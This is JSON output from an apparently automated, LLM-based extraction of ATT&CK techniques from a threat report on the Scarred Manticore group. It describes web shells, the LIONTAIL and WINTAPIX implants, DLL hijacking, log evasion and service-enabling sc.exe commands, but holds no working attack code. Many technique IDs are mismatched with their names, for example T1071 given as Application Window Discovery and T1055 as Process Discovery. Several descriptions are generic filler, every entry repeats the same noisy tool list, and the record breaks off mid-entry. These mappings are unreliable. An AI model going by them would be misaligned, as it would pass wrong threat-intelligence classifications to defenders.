{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 43,
      "processing_time_ms": 0
    },
    "extraction_results": [
      {
        "report_id": "pdf-795a10436052f4588088b76c772a703c",
        "extracted_ttps": [
          {
            "ttp_id": "4d651d13-b4f0-4e1d-a4cb-8c6f45dc0eca",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Protocol Tunneling",
            "attack_id": "T1572",
            "tactic": "Command and Control",
            "description": "Tunna web shell allows to connect from the outside to any service on the remote host, including those that are blocked on the firewall, as all the external communication to the web shell is done via HTTP",
            "confidence_score": 0.717,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.596,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Tunna web shell",
              "HTTP"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "Tunna web shell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e47c7c6f-1b6c-4408-940a-171f8c24069a",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The injected shellcode loads and executes an encrypted .NET payload, utilizing the lowest level of Windows HTTP Stack by interacting directly with the HTTP.sys driver",
            "confidence_score": 0.709,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.5,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HTTP.sys",
              "NET payload",
              "shellcode"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e927b948-c3ad-464b-9f74-002b8b6f292b",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Data from Local System",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "Scarred Manticore was involved in data exfiltration from the Albanian government networks, as well as email exfiltration from multiple organizations in the Middle Eastern countries",
            "confidence_score": 0.703,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.5,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Albanian government networks",
              "email exfiltration"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "Tunna web shell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "133d1435-ea1e-486b-bf7b-57990b994c5c",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The threat actor uses a commercial obfuscator to obfuscate the .NET payload, in addition to class, method, and string obfuscations",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "commercial obfuscator",
              "obfuscated .NET payload"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a761d0e5-455f-4310-bec5-40e5a2f1539e",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The attackers used command line arguments like 'sc.exe config Eaphost start=auto' and 'sc.exe start Eaphost' to enable specific services",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "sc.exe",
              "Eaphost"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2a8842b8-62a1-4211-bbb0-0a0c98764edc",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The threat actor uses the LIONTAIL framework to customize implants and their configuration parameters, potentially for application window discovery",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "LIONTAIL framework",
              "implant customization"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "LIONTAIL framework"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3de1664e-41da-4256-9b59-730eac536ad9",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The threat actor exfiltrates data from the victim's systems over a period of months, potentially using the LIONTAIL framework",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "data exfiltration",
              "LIONTAIL framework"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "LIONTAIL framework"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d0fd6e39-0baa-47b8-960e-6fc93efcffad",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Scarred Manticore uses custom web shells, custom DLL backdoors, and driver-based implants to attack Windows servers",
            "confidence_score": 0.689,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "custom web shells",
              "custom DLL backdoors",
              "driver-based implants"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "LIONTAIL framework"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ead3ec10-ceab-481d-ad28-a479fc1ac498",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The attackers gathered information about the system, including computer name, domain name, and number of processors",
            "confidence_score": 0.689,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetComputerNameW",
              "GetEnvironmentVariableA"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Windows APIs",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "15a4291b-4994-48ec-987a-14b22e7e777b",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Process Discovery",
            "attack_id": "T1055",
            "tactic": "Discovery",
            "description": "WINTAPIX driver enumerates user-mode processes to find a suitable process with local system privileges",
            "confidence_score": 0.688,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.359,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "WINTAPIX driver",
              "user-mode processes",
              "local system privileges"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "WINTAPIX driver",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f7a91766-a4db-4cd8-8e44-bd0d361b8b88",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The attackers exploited the absence of some DLLs on Windows Server OS distributions to install the backdoor",
            "confidence_score": 0.687,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "wlanapi.dll",
              "wlbsctrl.dll"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7994c9b7-1a3c-4279-be4a-566d5ca8ac9d",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The attackers gathered information about the system, including physical RAM, and data from registry keys",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.382,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GetPhysicallyInstalledSystemMemory",
              "NtOpenKey"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Windows APIs",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "714ff9af-1a46-4f7f-aed0-14c0a34d2eef",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Hijack Execution Flow",
            "attack_id": "T1574",
            "tactic": "Defense Evasion",
            "description": "The attackers used search order hijacking by Windows services or legitimate processes to install the backdoor",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "search order hijacking"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9d5971f5-304a-4659-9eed-023683ef5544",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Scarred Manticore deployed unique tools on compromised Internet-facing Windows servers in the Middle East region",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Exchange servers",
              "Windows servers"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "Tunna web shell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Impair Defenses",
            "attack_id": "T1562",
            "tactic": "Defense Evasion",
            "description": "The threat actor uses Event Log bypass by suspending EventLog Service threads to evade detection",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "EventLog Service",
              "thread suspension"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "LIONTAIL framework"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d9da67b0-9277-45ae-89eb-fea84f03b966",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attackers disguised the executable as Cyvera Console, a component of Cortex XDR",
            "confidence_score": 0.673,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Cyvera Console",
              "Cortex XDR"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "535ee83f-381a-47cd-8339-b940bd0e7428",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Scarred Manticore exfiltrates data using tailor-made tools and the LIONTAIL framework",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "LIONTAIL framework",
              "tailor-made tools"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "LIONTAIL framework"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Software Deployment Tools",
            "attack_id": "T1072",
            "tactic": "Execution",
            "description": "Scarred Manticore utilized both custom-written and open-source components in their toolset",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "custom-written components",
              "open-source components"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "Tunna web shell"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "43059aaa-944b-40dd-936e-e84d65117740",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Impair Defenses",
            "attack_id": "T1562",
            "tactic": "Defense Evasion",
            "description": "Scarred Manticore uses undocumented functionalities of the HTTP.sys driver to evade detection",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HTTP.sys driver"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "LIONTAIL framework"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3fe5635b-9d3a-4cbb-92ea-b0786d7336ba",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Scarred Manticore uses cmd to execute commands on compromised servers",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d4065394-87ee-406f-8d12-077f9c921d94",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "Scarred Manticore uses SystemInfo to gather information about compromised servers",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "SystemInfo"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "265996da-8061-463e-bedb-9ccacb414259",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Protocol Impersonation",
            "attack_id": "T1572",
            "tactic": "Command and Control",
            "description": "Impersonation of protocols for command and control",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HttpListener"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "apt",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "HttpListener"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c30dc268-365a-429e-9f4e-0f55030ae53c",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Boot or Logon Autostart Execution",
            "attack_id": "T1547",
            "tactic": "Persistence",
            "description": "WINTAPIX driver is loaded in the kernel",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "WINTAPIX driver",
              "kernel"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "WINTAPIX driver",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a3a073e9-c1e9-47f3-b0cc-b4ed78ceb338",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Exfiltration of data through command and control channel",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "HttpListener"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "apt",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "HttpListener"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "25483796-42eb-4135-9c52-60e39c25e9e3",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "PowerShell",
            "attack_id": "T1059.001",
            "tactic": "Execution",
            "description": "Attacker used PowerShell with base64 encoding to execute commands",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.58,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "powershell.exe",
              "-enc"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "reg",
              "PowerShell",
              "base64",
              "cmd",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "dd1bd711-6ab5-4eaf-9f56-496395ee248a",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "User execution of malicious code through cmd.exe",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b82cb3b6-aa9e-4a92-a97c-b3dda50d8b60",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "Discovery of application windows through SystemInfo tool",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "SystemInfo"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Use of remote services for lateral movement",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ClientBin.aspx"
            ],
            "tools": [
              "ClientBin.aspx",
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a03d2651-9c85-47a3-9c01-650f81f4dc78",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "Discovery of system information through SystemInfo tool",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "SystemInfo"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6a461787-03c4-46a3-93a4-c91d1e3a7871",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Modify Registry",
            "attack_id": "T1112",
            "tactic": "Persistence",
            "description": "Modification of registry for persistence",
            "confidence_score": 0.645,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.152,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ServerManager"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "ServerManager",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b1d804f5-4105-4fff-9bc7-ffef379ebf3e",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Data from Local System",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "Collection of data from local system",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PackageType"
            ],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt",
              "PackageType"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7ae037f4-11f6-495b-aeaa-58cccdb65901",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "1d64e518-0929-402d-a6e7-89a29245bad8",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
